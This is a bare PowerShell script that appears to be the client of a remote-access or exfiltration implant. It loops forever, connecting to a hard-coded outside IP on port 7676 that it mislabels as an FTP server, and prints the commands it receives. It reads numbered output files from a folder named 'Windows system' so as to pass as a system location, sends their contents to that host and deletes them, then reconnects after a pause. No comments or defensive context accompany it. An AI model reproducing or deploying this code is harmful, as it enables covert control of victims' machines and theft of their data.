$FTPServer = '23.95.80.128';
$FTPPort = '7676';
$inputCounter = 0;
$outputCounter = 0;
$testConnection=0; 

while(1){
    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
    $tcpStream = $tcpConnection.GetStream();
    $reader = New-Object System.IO.StreamReader($tcpStream);
    $writer = New-Object System.IO.StreamWriter($tcpStream);
    $writer.AutoFlush = $true;
    $buffer = new-object System.Byte[] 1024;
    $encoding = new-object System.Text.AsciiEncoding;
    
    
    while ($tcpConnection.Connected) {
        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {   
            write-host $reader.ReadLine();
            $inputCounter+=1;
        }

        $pathOutput = -join('C:\Program Files\Windows system\output',$outputCounter,'.txt');
        if(Test-Path $pathOutput){
            $output = Get-Content $pathOutput;
            if($output.length -ge 1){
                Foreach($s in $output){
                    $writer.WriteLine($s);
                };  
            };
            $outputCounter+=1;
            Remove-Item $pathOutput;
        }
    
        start-sleep -Milliseconds 120;
        $testConnection+=1;
        if($testConnection -ge 48){
            $writer.WriteLine('');
            $testConnection=0;
        }
    };
    
    $reader.Close();
    $writer.Close();
    $tcpConnection.Close();
    
    start-sleep -Milliseconds 7000;
}
